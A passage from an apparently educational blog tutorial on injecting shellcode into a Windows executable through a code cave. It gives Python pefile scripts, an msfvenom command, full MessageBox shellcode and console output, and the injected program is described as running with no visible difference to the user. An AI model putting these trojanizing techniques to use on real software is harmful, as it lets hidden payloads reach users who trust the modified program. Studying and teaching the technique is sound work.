    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  1. Program starts at </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s">0x</span><span class="si">{</span><span class="n">cave_rva</span><span class="si">:</span><span class="n">X</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> (our code)</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  2. Executes 5 NOPs (does nothing 5 times)</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  3. JMP to </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s">0x</span><span class="si">{</span><span class="n">original_entry</span><span class="si">:</span><span class="n">X</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> (original code)</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  4. Calculator runs normally</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BLUE</span><span class="si">}</span><span class="s">The user won</span><span class="sh">'</span><span class="s">t notice anything different!</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">5</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">RED</span><span class="si">}</span><span class="s">Usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;input.exe&gt; &lt;output.exe&gt; &lt;cave_rva&gt; &lt;cave_raw&gt;</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}</span><span class="s">Example:</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s">python </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> Calculator.exe Calc_injected.exe 0x2239 0x1639</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}</span><span class="s">How to get cave_rva and cave_raw:</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  Run: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s">python find_caves.py Calculator.exe</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  Use the RVA and file offset values from the output</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    
    <span class="nf">simple_injection</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nf">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="mi">16</span><span class="p">),</span> <span class="nf">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="mi">16</span><span class="p">))</span>
</pre></table></code></div></div><p><strong>Running the script:</strong></p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python3 inject_simple.py Calculator.exe Calculator_test.exe 0x2239 0x1639
</pre></table></code></div></div><div class="language-console nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre><td class="rouge-code"><pre><span class="go">=== Simple Code Injection ===

[Step 1] Original entry point: 0x18C0
         Program currently starts here

[Step 2] Code cave location: 0x2239
         This is where we'll write our code

[Step 3] Our code: 5 NOP instructions
         In hex: 9090909090
         Each 90 = NOP (do nothing)

[Step 4] Calculating JMP offset:
         JMP from: 0x223E (after our NOPs)
         JMP to: 0x18C0 (original entry)
         Formula: 0x18c0 - (0x223e + 5)
         Offset: -2435 (0xfffff67d)

[Step 5] Complete code:
         9090909090e97df6ffff
         ^ 90 90 90 90 90 = 5 NOPs
         ^ E9 XX XX XX XX = JMP with offset

[Step 6] Writing to file offset 0x1639
         Wrote 10 bytes

[Step 7] Changing entry point:
         Old: 0x18C0
         New: 0x2239
         Now program starts at our code!

[Success] Saved as: Calculator_test.exe

What happens when you run it:
  1. Program starts at 0x2239 (our code)
  2. Executes 5 NOPs (does nothing 5 times)
  3. JMP to 0x18C0 (original code)
  4. Calculator runs normally

The user won't notice anything different!
</span></pre></table></code></div></div><p><strong>Testing:</strong></p><p>Run the injected program:</p><div class="language-powershell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Calculator_test.exe</span><span class="w">
</span></pre></table></code></div></div><p><a href="/assets/img/posts/binary-injection-in-windows-app/simple-injection.png" class="popup img-link shimmer"><img src="/assets/img/posts/binary-injection-in-windows-app/simple-injection.png" alt="Simple injection success" loading="lazy"></a> <em>The calculator functions normally after a simple injection.</em></p><p>It works! The program runs normally, but it executed our 5 NOPs first. We successfully injected code!</p><h4 id="generating-the-payload"><span class="me-2">Generating the Payload</span><a href="#generating-the-payload" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>We’ll use <code class="language-plaintext highlighter-rouge">msfvenom</code> (part of Metasploit Framework) to generate a MessageBox shellcode:</p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>msfvenom <span class="nt">-p</span> windows/x64/messagebox <span class="nv">TITLE</span><span class="o">=</span><span class="s1">'Hacked!'</span> <span class="nv">TEXT</span><span class="o">=</span><span class="s1">'Code Injected!'</span> <span class="nv">ICON</span><span class="o">=</span><span class="s1">'INFORMATION'</span> <span class="nt">-f</span> python
</pre></table></code></div></div><p>This generates shellcode that:</p><ol><li>Calls Windows API MessageBoxA<li>Shows a popup with title “Hacked!” and text “Code Injected!”<li>Exits the process (we’ll fix this)</ol><p>The output will be Python code like:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">buf</span> <span class="o">=</span>  <span class="sa">b</span><span class="sh">""</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xfc\x48\x81\xe4\xf0\xff\xff\xff</span><span class="s">...</span><span class="sh">"</span>
<span class="c1"># ... many lines of shellcode
</span></pre></table></code></div></div><blockquote class="prompt-warning"><p><strong>Important:</strong> msfvenom adds <code class="language-plaintext highlighter-rouge">ExitProcess</code> at the end (last 6 bytes), which terminates the program. We need to remove these bytes and add our own JMP instead.</p></blockquote><h4 id="the-complete-injection-script"><span class="me-2">The Complete Injection Script</span><a href="#the-complete-injection-script" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div file="inject_messagebox.py" class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="inject_messagebox.py"><i class="far fa-file-code fa-fw"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">pefile</span>
<span class="kn">import</span> <span class="n">struct</span>
<span class="kn">import</span> <span class="n">sys</span>

<span class="c1"># ANSI Color codes
</span><span class="k">class</span> <span class="nc">Colors</span><span class="p">:</span>
    <span class="n">HEADER</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[95m</span><span class="sh">'</span>
    <span class="n">BLUE</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[94m</span><span class="sh">'</span>
    <span class="n">CYAN</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[96m</span><span class="sh">'</span>
    <span class="n">GREEN</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[92m</span><span class="sh">'</span>
    <span class="n">YELLOW</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[93m</span><span class="sh">'</span>
    <span class="n">RED</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[91m</span><span class="sh">'</span>
    <span class="n">BOLD</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[1m</span><span class="sh">'</span>
    <span class="n">END</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span>

<span class="c1"># Shellcode generated by msfvenom (ExitProcess removed - last 6 bytes)
</span><span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">""</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x00\x41\x51\x41\x50\x52\x48\x31\xd2\x65\x48\x8b</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x52\x60\x51\x48\x8b\x52\x18\x56\x48\x8b\x52\x20</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x41\x51\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x8b\x48</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x18\x50\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x88\x41\x58\x41\x58\x5e\x59\x48\x01\xd0\x5a\x41</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4b\xff\xff</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xff\x5d\xe8\x0b\x00\x00\x00\x75\x73\x65\x72\x33</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c\x77\x26</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x07\xff\xd5\x49\xc7\xc1\x40\x00\x00\x00\xe8\x0f</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x00\x00\x00\x43\x6f\x64\x65\x20\x49\x6e\x6a\x65</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x63\x74\x65\x64\x21\x00\x5a\xe8\x08\x00\x00\x00</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x48\x61\x63\x6b\x65\x64\x21\x00\x41\x58\x48\x31</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xc9\x41\xba\x45\x83\x56\x07\xff\xd5\x48\x31\xc9</span><span class="sh">"</span>

<span class="k">def</span> <span class="nf">inject_messagebox</span><span class="p">(</span><span class="n">input_file</span><span class="p">,</span> <span class="n">output_file</span><span class="p">,</span> <span class="n">cave_rva</span><span class="p">,</span> <span class="n">cave_raw</span><span class="p">,</span> <span class="n">cave_size</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s">Inject MessageBox shellcode into code cave</span><span class="sh">"""</span>
    <span class="n">pe</span> <span class="o">=</span> <span class="n">pefile</span><span class="p">.</span><span class="nc">PE</span><span class="p">(</span><span class="n">input_file</span><span class="p">)</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s">=== MessageBox Injection ===</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="n">original_entry</span> <span class="o">=</span> <span class="n">pe</span><span class="p">.</span><span class="n">OPTIONAL_HEADER</span><span class="p">.</span><span class="n">AddressOfEntryPoint</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">[1] Target Information:</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    Original entry: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s">0x</span><span class="si">{</span><span class="n">original_entry</span><span class="si">:</span><span class="n">X</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    Code cave: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s">0x</span><span class="si">{</span><span class="n">cave_rva</span><span class="si">:</span><span class="n">X</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    Cave size: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}{</span><span class="n">cave_size</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> bytes</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="c1"># Build complete shellcode
</span>    <span class="n">shellcode</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">(</span><span class="n">MESSAGEBOX_SHELLCODE</span><span class="p">)</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">[2]</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> MessageBox shellcode: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}{</span><span class="nf">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> bytes</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BLUE</span><span class="si">}</span><span class="s">This code will show a popup window</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="c1"># Add JMP back to original entry
</span>    <span class="n">jmp_offset</span> <span class="o">=</span> <span class="n">original_entry</span> <span class="o">-</span> <span class="p">(</span><span class="n">cave_rva</span> <span class="o">+</span> <span class="nf">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)</span>
    <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\xE9</span><span class="sh">'</span>
    <span class="n">shellcode</span> <span class="o">+=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">'</span><span class="s">&lt;i</span><span class="sh">'</span><span class="p">,</span> <span class="n">jmp_offset</span><span class="p">)</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">[3]</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> Adding JMP to return to original code</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    Total size: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}{</span><span class="nf">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> bytes</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="c1"># Check if it fits
</span>    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">cave_size</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">RED</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">[ERROR]</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> Shellcode (</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}{</span><span class="nf">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> bytes) &gt; Cave (</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}{</span><span class="n">cave_size</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> bytes)</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">        Need </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">RED</span><span class="si">}{</span><span class="nf">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">-</span> <span class="n">cave_size</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> more bytes!</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">False</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">[4] Size check: OK!</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    Shellcode: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}{</span><span class="nf">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> bytes</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    Cave: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}{</span><span class="n">cave_size</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> bytes</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    Remaining: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}{</span><span class="n">cave_size</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> bytes</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="c1"># Write shellcode
</span>    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">[5]</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> Writing shellcode to offset </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s">0x</span><span class="si">{</span><span class="n">cave_raw</span><span class="si">:</span><span class="n">X</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">pe</span><span class="p">.</span><span class="nf">set_bytes_at_offset</span><span class="p">(</span><span class="n">cave_raw</span><span class="p">,</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s">Written successfully!</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="c1"># Change entry point
</span>    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">[6]</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> Changing entry point:</span><span class="sh">"</span><span class="p">)</span>
